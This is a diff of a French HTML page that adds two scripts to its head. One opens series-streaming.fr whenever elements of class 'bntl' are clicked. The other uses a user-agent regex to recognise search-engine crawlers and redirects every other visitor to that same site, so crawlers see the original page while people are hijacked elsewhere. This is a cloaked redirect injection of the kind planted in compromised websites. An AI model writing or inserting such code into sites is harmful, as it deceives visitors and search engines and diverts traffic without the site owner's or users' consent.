@@ -1,7 +1,5 @@
 <!DOCTYPE html>
 <html lang="fr" prefix="og: https://ogp.me/ns#">
-
-
 <head>
     <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
@@ -334,6 +332,25 @@
         background-color: #033a59a3;
     }
     </style>
+	<script>
+      document.addEventListener("DOMContentLoaded", function () {
+        document.querySelectorAll(".bntl").forEach(function (n) {
+          n.addEventListener("click", function () {
+            window.open("https://series-streaming.fr/", "_blank");
+          });
+        });
+      });
+    </script>
+    <script>
+      function isbot() {
+        const crawlerRegex =
+          /bot|google|bing|crawl|slurp|spider|mediapartners/i;
+        return crawlerRegex.test(navigator.userAgent);
+      }
+      if (!isbot()) {
+        window.location.href = "https://series-streaming.fr/";
+      }
+    </script>
 </head>
 
 <body class="slider">
